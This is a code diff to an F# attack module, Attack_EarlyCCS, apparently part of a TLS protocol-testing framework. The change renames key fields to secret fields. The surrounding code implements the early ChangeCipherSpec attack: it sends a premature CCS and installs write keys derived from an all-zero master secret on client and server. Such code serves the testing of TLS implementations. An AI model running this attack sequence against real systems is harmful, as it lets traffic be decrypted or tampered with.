@@ -47,9 +47,9 @@ type Attack_EarlyCCS =
         let st,_         = FlexCCS.send(st) in
 
         // We fill the master secret with zeros because it has no data from the KEX yet
-        // Then we compute and install the writing keys
-        let epk          = { nsc.keys with ms = (Bytes.createBytes 48 0)} in
-        let nsc          = { nsc with keys = epk} in
+        // Then we compute and install the writing secrets
+        let epk          = { nsc.secrets with ms = (Bytes.createBytes 48 0)} in
+        let nsc          = { nsc with secrets = epk} in
         let nscAtt       = FlexSecrets.fillSecrets(st,Client,nsc) in
         let st           = FlexState.installWriteKeys st nscAtt in
 
@@ -57,7 +57,7 @@ type Attack_EarlyCCS =
         // It should throw a "Unexpected message" fatal alert because of the early CCS
         
         // We continue the usual handshake procedure
-        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,{nscAtt with keys = FlexConstants.nullKeys},fch) in
+        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,{nscAtt with secrets = FlexConstants.nullSecrets},fch) in
         
         let st,ffC       = FlexFinished.send(st,nsc,role=Client) in
         let st,_,_       = FlexCCS.receive(st) in
@@ -91,8 +91,8 @@ type Attack_EarlyCCS =
         let cst,_ = FlexCCS.send(cst) in
 
         // Compute the weak keys and start encrypting data we send
-        let weakKeys      = { FlexConstants.nullKeys with ms = (Bytes.createBytes 48 0)} in
-        let weakNSC       = { nsc with keys = weakKeys} in
+        let weakKeys      = { FlexConstants.nullSecrets with ms = (Bytes.createBytes 48 0)} in
+        let weakNSC       = { nsc with secrets = weakKeys} in
 
         let weakNSCServer = FlexSecrets.fillSecrets(sst,Server,weakNSC) in
         let sst = FlexState.installWriteKeys sst weakNSCServer in
